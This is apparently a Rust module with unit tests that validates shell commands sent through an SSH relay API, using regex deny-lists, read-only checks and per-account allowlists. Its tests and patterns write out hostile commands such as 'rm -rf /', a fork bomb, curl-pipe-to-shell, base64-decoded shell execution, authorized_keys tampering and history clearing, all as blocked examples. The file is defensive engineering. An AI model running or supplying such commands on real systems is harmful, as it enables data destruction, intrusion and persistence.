//! API-mode command validation. This is the anti-abuse core of the relay:
//! a command submitted over HTTP must be *legal*, *non-destructive* and
//! *authorized for the account* before it ever reaches an SSH exec channel.
//!
//! Differences from the interactive terminal's `CommandSafetyChecker`:
//!
//! - The terminal checker can return `Warn` because a human sits in front of
//!   the confirm dialog. An unattended API client has no such step, so
//!   **every dangerous pattern is a hard Block here**.
//! - The API adds a stricter deny-list on top: shell and SSH abstractions
//!   (`eval`, command substitution is allowed but the inner text is checked
//!   too), network egress commands are fine, but anything touching block
//!   devices, process tables (`kill -9 1`), boot flow, or the SSH/auth
//!   configuration of the remote host is rejected.
//! - Per-account regex allowlists let the administrator confine an account
//!   to a positive command set (e.g. `^docker (ps|logs)`), which is far
//!   stronger than deny-listing alone.

use regex::Regex;
use rusterm_core::command_safety::{CommandSafetyChecker, SafetyVerdict};

/// Maximum accepted command length. Protects against absurd payloads and
/// keeps audit logs readable.
pub const MAX_COMMAND_LEN: usize = 4096;

#[derive(Debug, Clone, thiserror::Error)]
pub enum ValidationError {
    #[error("command is empty")]
    Empty,
    #[error("command exceeds {MAX_COMMAND_LEN} bytes")]
    TooLong,
    #[error("command contains NUL or control characters")]
    ControlChars,
    #[error("command is blocked by safety policy: {0}")]
    Dangerous(String),
    #[error("command is not in the account's allowlist")]
    NotAllowed,
    #[error("readonly account may only run non-mutating commands")]
    ReadonlyViolation,
}

/// One validator instance per relay; constructed once at startup.
pub struct CommandValidator {
    terminal_checker: CommandSafetyChecker,
    api_patterns: Vec<(Regex, &'static str)>,
    mutating_patterns: Vec<Regex>,
}

impl std::fmt::Debug for CommandValidator {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("CommandValidator").finish_non_exhaustive()
    }
}

impl Default for CommandValidator {
    fn default() -> Self {
        Self::new()
    }
}

impl CommandValidator {
    pub fn new() -> Self {
        // Hard-block patterns for the unattended API. Everything the
        // terminal checker warns about is a block here; these are the API
        // extras.
        let api_raw: &[(&str, &str)] = &[
            // Killing init / kernel threads or every process at once.
            (
                r"\bkill(9|all)?\s+-(9|KILL)\s+(-1\b|1\b)",
                "kill init or all processes",
            ),
            (r"\bkillall\s+-(9|KILL)\b", "killall -9"),
            // Writing to memory or system devices.
            (
                r">\s*/dev/(k?mem|null2|port|core)\b",
                "write to system device",
            ),
            // Messing with mount/umount of system filesystems.
            (
                r"\b(mount|umount)\b[^;&|]*\s/(boot|sys|proc|dev|usr|etc|var)?\s*$",
                "mount/unmount of system path",
            ),
            // iptables flush / disabling the firewall remotely.
            (r"\biptables\s+-F", "flush firewall rules"),
            (
                r"\b(?:systemctl\s+(?:stop|disable|mask)\s+firewalld|ufw\s+disable)",
                "disable firewall",
            ),
            // Disabling SELinux.
            (r"\bsetenforce\s+0", "disable SELinux"),
            // Overwriting authorized_keys / sshd config remotely.
            (r"authorized_keys", "modifying SSH authorized_keys"),
            (
                r">\s*[^;&|]*\b(?:sshd_config|/etc/passwd|/etc/shadow|/etc/sudoers)",
                "overwriting system auth config",
            ),
            // Deleting or rewriting shell history is an anti-forensics
            // signal for abuse of the relay.
            (r"\bhistory\s+-c\b", "clearing shell history"),
            (r">\s*[^;&|]*\.\w*history\b", "truncating shell history"),
            // curl/wget piped directly into a shell download-and-execute —
            // the single most abused pattern on an open relay.
            (
                r"\b(?:curl|wget)\b[^;&|]*\|\s*(?:sudo\s+)?(?:ba|z|fi)?sh\b",
                "download-and-execute pipe into shell",
            ),
            // `eval` of untrusted text — defeats pattern checking.
            (r"\beval\s", "eval wrapper"),
            // Base64-blind execution: `echo <blob> | base64 -d | sh`.
            (
                r"base64\s+(-d|--decode)[^;&|]*\|\s*(?:sudo\s+)?(?:ba|z|fi)?sh\b",
                "base64-obfuscated shell exec",
            ),
            // User management.
            (
                r"\b(?:useradd|userdel|usermod|passwd)\b",
                "account management on remote host",
            ),
            // chmod/chown recursive on sensitive trees.
            (
                r"\b(?:chmod|chown|chgrp)\s+[^;&|]*-R[^;&|]*\s/(etc|boot|usr|lib|var|sys|proc|dev)\b",
                "recursive permission change on system tree",
            ),
            // Cron tampering.
            (r"\bcrontab\s+-[^l]", "crontab modification"),
            // Kernel modules.
            (
                r"\b(?:insmod|rmmod|modprobe\s+-r)\b",
                "kernel module load/unload",
            ),
            // Dangerous verbs hidden inside command substitution —
            // `$(rm -rf /)`, "`rm -rf /`". The terminal checker's `\brm`
            // pattern does not fire after `$(` because there is no word
            // boundary between `(` and `rm`'s `r` when preceded by `$`/`(`.
            (
                r"[$`][({ ]*(?:sudo[ 	]+)?(?:rm[ 	]+-[a-zA-Z]*[rf]|dd[ 	]|mkfs|shutdown|reboot|halt|poweroff)",
                "dangerous command inside command substitution",
            ),
        ];
        let api_patterns: Vec<(Regex, &'static str)> = api_raw
            .iter()
            .map(|(pat, reason)| {
                (
                    Regex::new(pat).unwrap_or_else(|e| panic!("invalid API regex {:?}: {e}", pat)),
                    *reason,
                )
            })
            .collect();

        // Patterns that classify a command as *mutating*. Used to enforce the
        // read-only account flag. This is coarse by design — false positives
        // (blocking a read) are safe; false negatives (allowing a write) are
        // not, so we lean towards "mutating".
        let mutating_defs: &[&str] = &[
            r"\b(?:rm|rmdir|mv|cp|install|touch|mkdir|ln|truncate)\b",
            r"\b(?:dd|mkfs|fdisk|parted|mount|umount)\b",
            r"\b(?:kill|pkill|killall)\b",
            r"\b(?:chmod|chown|chgrp|setfacl)\b",
            r"\b(?:apt|apt-get|yum|dnf|apk|pacman|pip|npm|cargo)\s+(?:install|remove|upgrade|update)\b",
            r"\bsystemctl\s+(?:start|stop|restart|reload|enable|disable|mask|unmask)\b",
            r"\bdocker\s+(?:run|rm|rmi|stop|start|restart|exec|build|pull|push|compose)\b",
            r"\bkubectl\s+(?:apply|delete|create|replace|patch|scale|rollout)\b",
            r"\bgit\s+(?:push|reset|checkout\s+-f|clean|commit|merge|rebase)\b",
            r">+\s*[^|]", // any output redirection
            r"\btee\b",
            r"\bsed\s+-i\b",
        ];
        let mutating_patterns: Vec<Regex> = mutating_defs
            .iter()
            .map(|pat| {
                Regex::new(pat).unwrap_or_else(|e| panic!("invalid mutating regex {:?}: {e}", pat))
            })
            .collect();

        Self {
            terminal_checker: CommandSafetyChecker::new(),
            api_patterns,
            mutating_patterns,
        }
    }

    /// Full validation for one submit. `allowlist` is the account's
    /// `allowed_commands` (empty = no extra restriction); `readonly` mirrors
    /// the account flag.
    pub fn validate(
        &self,
        command: &str,
        allowlist: &[Regex],
        readonly: bool,
    ) -> Result<(), ValidationError> {
        if command.is_empty() {
            return Err(ValidationError::Empty);
        }
        if command.len() > MAX_COMMAND_LEN {
            return Err(ValidationError::TooLong);
        }
        if command
            .chars()
            .any(|c| c.is_control() && c != '\t' && c != '\n' && c != '\r')
        {
            return Err(ValidationError::ControlChars);
        }

        // Hard blocks, terminal rules first (now fatal, no Warn escape).
        if let SafetyVerdict::Warn(reason) | SafetyVerdict::Block(reason) =
            self.terminal_checker.check(command)
        {
            return Err(ValidationError::Dangerous(reason));
        }
        for (regex, reason) in &self.api_patterns {
            if regex.is_match(command) {
                return Err(ValidationError::Dangerous((*reason).to_string()));
            }
        }

        // Read-only accounts: reject anything classified as mutating.
        if readonly && self.is_mutating(command) {
            return Err(ValidationError::ReadonlyViolation);
        }

        // Positive allowlist, when configured.
        if !allowlist.is_empty() && !allowlist.iter().any(|r| r.is_match(command)) {
            return Err(ValidationError::NotAllowed);
        }
        Ok(())
    }

    pub fn is_mutating(&self, command: &str) -> bool {
        self.mutating_patterns.iter().any(|r| r.is_match(command))
    }
}

/// Compile an account's `allowed_commands` string list into regexes.
/// Invalid patterns are reported with their index so the UI can flag them.
pub fn compile_allowlist(patterns: &[String]) -> Result<Vec<Regex>, Vec<(usize, String)>> {
    let mut ok = Vec::with_capacity(patterns.len());
    let mut errors = Vec::new();
    for (idx, pat) in patterns.iter().enumerate() {
        match Regex::new(pat) {
            Ok(r) => ok.push(r),
            Err(e) => errors.push((idx, e.to_string())),
        }
    }
    if errors.is_empty() {
        Ok(ok)
    } else {
        Err(errors)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn validator() -> CommandValidator {
        CommandValidator::new()
    }

    fn ok(cmd: &str) {
        validator()
            .validate(cmd, &[], false)
            .unwrap_or_else(|e| panic!("expected ok for {cmd:?}, got {e}"));
    }

    fn blocked(cmd: &str) -> ValidationError {
        validator()
            .validate(cmd, &[], false)
            .err()
            .unwrap_or_else(|| panic!("expected block for {cmd:?}"))
    }

    #[test]
    fn benign_commands_pass() {
        ok("ls -la /var/log");
        ok("docker ps -a");
        ok("systemctl status nginx");
        ok("df -h && uptime");
        ok("grep ERROR /var/log/app.log | tail -20");
        ok("cat /proc/cpuinfo | head");
    }

    #[test]
    fn empty_and_oversized() {
        assert!(matches!(blocked(""), ValidationError::Empty));
        let long = "a".repeat(MAX_COMMAND_LEN + 1);
        assert!(matches!(blocked(&long), ValidationError::TooLong));
    }

    #[test]
    fn control_characters_rejected() {
        // ESC byte could smuggle terminal control sequences through exec.
        assert!(matches!(
            blocked("ls \u{1b}[2J"),
            ValidationError::ControlChars
        ));
    }

    #[test]
    fn terminal_rules_become_hard_blocks() {
        // Every pattern the interactive checker *warns* about is fatal here.
        for cmd in [
            "rm -rf /",
            "rm -rf /*",
            "rm -rf ~",
            "dd if=/dev/zero of=/dev/sda",
            "mkfs.ext4 /dev/sda1",
            "echo x > /dev/sdb",
            ":(){ :|:& };:",
            "chmod -R 777 /",
            "shutdown -h now",
            "reboot",
        ] {
            assert!(
                matches!(blocked(cmd), ValidationError::Dangerous(_)),
                "expected Dangerous for {cmd:?}"
            );
        }
    }

    #[test]
    fn api_specific_blocks() {
        assert!(matches!(
            blocked("curl http://x/y.sh | sh"),
            ValidationError::Dangerous(_)
        ));
        assert!(matches!(
            blocked("curl http://x/y.sh | sudo bash"),
            ValidationError::Dangerous(_)
        ));
        assert!(matches!(
            blocked("wget -qO- http://x | sh"),
            ValidationError::Dangerous(_)
        ));
        assert!(matches!(
            blocked("echo aGk= | base64 -d | sh"),
            ValidationError::Dangerous(_)
        ));
        assert!(matches!(
            blocked("eval \"$PAYLOAD\""),
            ValidationError::Dangerous(_)
        ));
        assert!(matches!(
            blocked("kill -9 1"),
            ValidationError::Dangerous(_)
        ));
        assert!(matches!(
            blocked("killall -9"),
            ValidationError::Dangerous(_)
        ));
        assert!(matches!(
            blocked("iptables -F"),
            ValidationError::Dangerous(_)
        ));
        assert!(matches!(
            blocked("systemctl stop firewalld"),
            ValidationError::Dangerous(_)
        ));
        assert!(matches!(
            blocked("setenforce 0"),
            ValidationError::Dangerous(_)
        ));
        assert!(matches!(
            blocked("echo key >> ~/.ssh/authorized_keys"),
            ValidationError::Dangerous(_)
        ));
        assert!(matches!(
            blocked("echo x > /etc/sshd_config"),
            ValidationError::Dangerous(_)
        ));
        assert!(matches!(
            blocked("history -c"),
            ValidationError::Dangerous(_)
        ));
        assert!(matches!(
            blocked("useradd backdoor"),
            ValidationError::Dangerous(_)
        ));
        assert!(matches!(
            blocked("chmod -R 777 /etc"),
            ValidationError::Dangerous(_)
        ));
        assert!(matches!(
            blocked("crontab -r"),
            ValidationError::Dangerous(_)
        ));
        assert!(matches!(
            blocked("rmmod foo"),
            ValidationError::Dangerous(_)
        ));
        assert!(matches!(
            blocked("umount /etc"),
            ValidationError::Dangerous(_)
        ));
    }

    #[test]
    fn readonly_accounts_blocked_from_mutations() {
        let v = validator();
        for cmd in [
            "rm -f /tmp/x",
            "docker stop web",
            "systemctl restart nginx",
            "echo hi > /tmp/f",
            "sed -i s/a/b/ f",
            "kill 1234",
        ] {
            assert!(
                matches!(
                    v.validate(cmd, &[], true),
                    Err(ValidationError::ReadonlyViolation)
                ),
                "expected ReadonlyViolation for {cmd:?}"
            );
        }
        // but reads are fine
        v.validate("docker ps", &[], true).unwrap();
        v.validate("systemctl status nginx", &[], true).unwrap();
        v.validate("git log --oneline -5", &[], true).unwrap();
    }

    #[test]
    fn allowlist_enforced_when_present() {
        let v = validator();
        let allow = compile_allowlist(&[r"^docker\s+(ps|logs|stats)\b".to_string()]).unwrap();
        assert!(v.validate("docker ps -a", &allow, false).is_ok());
        assert!(
            v.validate("docker logs web --tail 10", &allow, false)
                .is_ok()
        );
        assert!(matches!(
            v.validate("apt update", &allow, false),
            Err(ValidationError::NotAllowed)
        ));
        assert!(matches!(
            v.validate("ls", &allow, false),
            Err(ValidationError::NotAllowed)
        ));
    }

    #[test]
    fn denylist_beats_allowlist() {
        // Even if an admin foolishly allows `.*`, hard blocks still win.
        let v = validator();
        let allow = compile_allowlist(&[".*".to_string()]).unwrap();
        assert!(matches!(
            v.validate("rm -rf /", &allow, false),
            Err(ValidationError::Dangerous(_))
        ));
    }

    #[test]
    fn injection_variants_blocked() {
        // Chaining with separators cannot smuggle dangerous commands.
        blocked("ls; rm -rf /");
        blocked("ls && rm -rf /");
        assert!(matches!(
            blocked("$(rm -rf /)"),
            ValidationError::Dangerous(_)
        ));
        assert!(matches!(
            blocked("`rm -rf /`"),
            ValidationError::Dangerous(_)
        ));
    }

    #[test]
    fn compile_allowlist_reports_bad_pattern() {
        let err = compile_allowlist(&["ok".to_string(), "[bad(".to_string()]).unwrap_err();
        assert_eq!(err.len(), 1);
        assert_eq!(err[0].0, 1);
    }
}
